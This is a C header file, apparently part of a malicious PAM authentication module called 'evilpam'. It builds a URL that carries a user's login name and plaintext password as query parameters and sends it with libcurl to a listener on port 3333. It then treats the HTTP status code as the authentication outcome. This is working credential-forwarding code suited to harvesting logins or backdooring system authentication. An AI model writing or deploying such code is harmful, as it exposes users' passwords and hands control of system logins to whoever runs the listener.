#ifndef __EVILPAM_API
#define __EVILPAM_API

#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

char* create_url(const char* base, const char* endpoint, const char* username, const char* password) {
	int a = strlen(base);
	int b = strlen(username);
	int c = strlen(password);
	int e = strlen(endpoint);
	int d = 6;
	int len = a + b + c + d + e + 1;
	char* buffer = (char*) malloc(len);
	sprintf(buffer, "%s%s?u=%s&p=%s", base, endpoint, username, password);
	return buffer;
}

int req_auth(const char* endpoint, const char* username, const char* password) {
	CURL* curl = curl_easy_init();
	if (curl == NULL) return 1;
	char* url = create_url("http://127.0.0.1:3333/", endpoint, username, password);
#ifdef _TEST
	printf("%s\n", url);
#endif
	curl_easy_setopt(curl, CURLOPT_URL, url);
	curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
	curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
	CURLcode res = curl_easy_perform(curl);
	int ret = 0;
	if (res != CURLE_OK)
		ret = 2;
	long code = 0;
	curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
	if (code != 200)
		ret = 3;
	free(url);
	curl_easy_cleanup(curl);
	return ret;
}
#endif
